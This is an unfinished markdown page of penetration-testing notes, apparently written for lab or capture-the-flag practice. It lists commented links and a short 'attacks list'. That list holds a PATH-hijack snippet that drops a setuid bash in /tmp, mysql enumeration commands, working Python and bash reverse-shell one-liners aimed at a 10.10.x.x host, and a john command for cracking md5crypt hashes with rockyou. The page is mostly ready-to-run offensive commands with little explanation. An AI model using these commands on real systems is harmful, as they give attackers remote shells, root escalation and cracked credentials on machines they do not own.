---
sort : 1
--- 


# Soon... 


Network/wireless/physical/Firewall/Social Eng/ .... Penetration testing ?? 
<!-- https://purplesec.us/types-penetration-testing/ -->


<!-- https://start.me/p/PwmnBd/web --> ALL 
<!-- https://www.mindmeister.com/1470766611/web-app-pentest?fullscreen=1 -->



Finding real IP behind CloudFlare or Tor
<!-- https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ -->



# be curious and not just a script kiddie.














# Attacks list

* PATH hijack  
    ```bash
    cd /tmp 
    export PATH=/tmp:$PATH

    echo "reverse shell" > bin
    # OR
    echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > bin 
    
    chmod +x bin
    ...

    ```
* Execution After Redirect (EAR)
* mysql ?? 
    ``` 
    mysql -u root -p 'passwd between qoutes' -e 'show databases;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'show tables;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'select * from table;' 
    ```










    
# reverse shells
## python
```python
export RHOST="10.10.x.x";export RPORT=1234; /usr/bin/python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

# Url encoded

```

## bash
```bash
bash -c "bash -i >& /dev/tcp/10.10.x.x/1234 0>&1"

# Url encoded
```












# Hash cracking
```bash
# md5   $1$ 

echo "hash" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt



# if you know the salt 




```